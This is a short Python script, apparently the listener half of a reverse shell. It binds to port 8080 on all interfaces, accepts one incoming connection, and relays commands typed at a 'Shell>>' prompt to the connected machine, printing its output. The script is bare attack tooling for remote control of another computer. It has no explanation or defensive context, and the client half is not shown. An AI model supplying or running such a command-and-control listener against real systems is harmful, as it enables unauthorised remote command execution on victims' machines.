#server
import socket
ip="0.0.0.0"
port=8080
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((ip,port))
s.listen(1)
conn,addr=s.accept()
print('[+]Connected to',addr)
while True:
     command=input("Shell>>")
     if command=='exit':
          conn.send(b'exit')
          conn.close()
          break
     else:
          conn.send(command.encode())
          output=conn.recv(1024)
          print(output)
